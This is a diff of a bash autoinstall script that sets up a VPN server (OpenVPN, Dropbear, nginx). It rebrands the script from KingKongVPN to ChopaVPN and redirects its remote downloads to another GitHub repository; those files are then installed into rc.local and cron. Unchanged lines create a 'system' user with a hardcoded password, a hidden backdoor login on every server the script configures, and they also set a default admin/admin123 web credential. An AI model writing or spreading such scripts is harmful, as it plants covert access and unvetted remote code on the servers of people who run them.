@@ -1,13 +1,13 @@
 #!/bin/bash
 # ****************************************
 # Program: Autoscript Setup VPS 2020     *
-# Developer: KingKongVPN                 *
-# Nickname: xiihaiqal                    *
-# Modify : @xiihaiqal                    *
+# Developer: CHOPAVPN                    * 
+# Nickname: ChopaVPN                    *
+# Modify : @ChopaVPN                    *
 # Date: 04-01-2015                       *
 # Last Updated: 29-12-2020               *
 # ****************************************
-# START SCRIPT ( KingKongVPN )
+# START SCRIPT ( CHOPAVPN )
 
 clear
 color1='\e[031;1m'
@@ -148,7 +148,7 @@ case $Accounts in
 		5)
 		clear
 		echo -e "${color1}========================================${color3}"
-        echo -e "* ${color2}SCRIPT AUTO INSTALL BY KingKongVPN ${color3}*"
+        echo -e "* ${color2}SCRIPT AUTO INSTALL BY ChopaVPN ${color3}*"
         echo -e "${color1}========================================${color3}"
 		rm AutoScript
 		exit
@@ -594,12 +594,12 @@ echo "push \"dhcp-option DNS 1.0.0.1\"" >> /etc/openvpn/server_udp.conf
  # executed/raised from this script (OpenVPN_TCP_Port/OpenVPN_UDP_Port)
  #
  # Enjoy the new update
- # Script Updated by KingKongVPN
+ # Script Updated by ChopaVPN
 NUovpn
 
  # Getting some OpenVPN plugins for unix authentication
  cd
- wget https://raw.githubusercontent.com/khvpn/install_script/master/Files/Other/plugin.tgz
+ wget https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/plugin.tgz
  tar -xzvf /root/plugin.tgz -C /etc/openvpn/
  rm -f plugin.tgz
 
@@ -626,9 +626,9 @@ chmod +x /etc/openvpn/openvpn.bash
  autokill 2
 
 # Setting Server
-wget -O /etc/rc.local "https://raw.githubusercontent.com/khvpn/install_script/master/Files/Other/rc.local"
+wget -O /etc/rc.local "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/rc.local"
 chmod +x /etc/rc.local
-#wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/khvpn/install_script/master/Files/Other/iptables.up.rules"
+#wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/iptables.up.rules"
 #sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 #iptables-restore < /etc/iptables.up.rules
 # Badvpn
@@ -786,7 +786,7 @@ cat <<'mySiteOvpn' > /home/vps/public_html/index.html
 <!DOCTYPE html>
 <html lang="en">
 
-<head><link rel="icon" type="image/png" href="https://cdn0.iconfinder.com/data/icons/universal-3-4/21/130-512.png"><meta charset="utf-8" /><title>KingkongVPN OVPN Config Download</title><meta name="description" content="KingKongVPN Server" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" /><meta name="theme-color" content="#000000" /><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"><link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.3/css/mdb.min.css" rel="stylesheet"></head><body><div class="container justify-content-center" style="margin-top:9em;margin-bottom:5em;"><div class="col-md"><div class="view"><img src="https://openvpn.net/wp-content/uploads/openvpn.jpg" class="card-img-top"><div class="mask rgba-white-slight"></div></div><div class="card"><div class="card-body"><h5 class="card-title">Config List</h5><br /><ul class="list-group">
+<head><link rel="icon" type="image/png" href="https://cdn0.iconfinder.com/data/icons/universal-3-4/21/130-512.png"><meta charset="utf-8" /><title>Chopa OVPN Config Download</title><meta name="description" content="KingKongVPN Server" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" /><meta name="theme-color" content="#000000" /><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"><link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.3/css/mdb.min.css" rel="stylesheet"></head><body><div class="container justify-content-center" style="margin-top:9em;margin-bottom:5em;"><div class="col-md"><div class="view"><img src="https://openvpn.net/wp-content/uploads/openvpn.jpg" class="card-img-top"><div class="mask rgba-white-slight"></div></div><div class="card"><div class="card-body"><h5 class="card-title">Config List</h5><br /><ul class="list-group">
 
 <li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>For UDP <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> UDP Server For OpenVPN</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-udp.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>
 
@@ -814,27 +814,27 @@ iptables -A INPUT -s $(wget -4qO- http://ipinfo.io/ip) -p tcp -m multiport --dpo
 sed -i '$ i\bash /etc/openvpn/openvpn.bash' /etc/rc.local
 
 ### OpenVPN Monitor
-wget -O /etc/nginx/conf.d/monitoring.conf "https://raw.githubusercontent.com/khvpn/install_script/master/Files/OpenVPN-Monitor/monitoring.conf"
+wget -O /etc/nginx/conf.d/monitoring.conf "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/OpenVPN-Monitor/monitoring.conf"
 apt-get install -y gcc libgeoip-dev python-virtualenv python-dev geoip-database-extra uwsgi uwsgi-plugin-python
-wget -O /srv/openvpn-monitor.tar.gz "https://raw.githubusercontent.com/khvpn/install_script/master/Files/OpenVPN-Monitor/openvpn-monitor.tar.gz"
+wget -O /srv/openvpn-monitor.tar.gz "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/OpenVPN-Monitor/openvpn-monitor.tar.gz"
 cd /srv
 tar xf openvpn-monitor.tar.gz
 cd openvpn-monitor
 virtualenv .
 . bin/activate
 pip install -r requirements.txt
-wget -O /etc/uwsgi/apps-available/openvpn-monitor.ini "https://raw.githubusercontent.com/khvpn/install_script/master/Files/OpenVPN-Monitor/openvpn-monitor.ini"
+wget -O /etc/uwsgi/apps-available/openvpn-monitor.ini "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/OpenVPN-Monitor/openvpn-monitor.ini"
 ln -s /etc/uwsgi/apps-available/openvpn-monitor.ini /etc/uwsgi/apps-enabled/
 
 # GeoIP For OpenVPN Monitor
 mkdir -p /var/lib/GeoIP
-wget -O /var/lib/GeoIP/GeoLite2-City.mmdb.gz "https://raw.githubusercontent.com/khvpn/install_script/master/Files/OpenVPN-Monitor/GeoLite2-City.mmdb.gz"
+wget -O /var/lib/GeoIP/GeoLite2-City.mmdb.gz "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/OpenVPN-Monitor/GeoLite2-City.mmdb.gz"
 gzip -d /var/lib/GeoIP/GeoLite2-City.mmdb.gz
 printf "admin:$(openssl passwd -apr1 admin123)\n" >> /etc/nginx/.htpasswd
 cd
 
 # etc
-wget -O /etc/motd "https://raw.githubusercontent.com/khvpn/install_script/master/Files/Other/motd"
+wget -O /etc/motd "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/motd"
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 useradd -m system
 echo "system:haiqal2020" | chpasswd
@@ -852,7 +852,7 @@ sudo apt-get update
 sudo apt-get install speedtest
 
 # Lock Dropbear Expired ID
-wget -O /usr/local/bin/lockidexp.sh "https://raw.githubusercontent.com/khvpn/install_script/master/Files/Other/lockidexp.sh"
+wget -O /usr/local/bin/lockidexp.sh "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/lockidexp.sh"
 chmod +x /usr/local/bin/lockidexp.sh
 crontab -l > mycron
 echo "1 8 * * * /usr/local/bin/lockidexp.sh" >> mycron
@@ -860,7 +860,7 @@ crontab mycron
 rm mycron
 
 # BlockTorrent
-wget -O /usr/local/bin/BlockTorrentEveryReboot "https://raw.githubusercontent.com/khvpn/install_script/master/Files/Other/BlockTorrentEveryReboot"
+wget -O /usr/local/bin/BlockTorrentEveryReboot "https://raw.githubusercontent.com/xiihaiqal/AutoScriptVPS/master/Files/Other/BlockTorrentEveryReboot"
 chmod +x /usr/local/bin/BlockTorrentEveryReboot
 crontab -l > mycron
 echo "@reboot /usr/local/bin/BlockTorrentEveryReboot" >> mycron
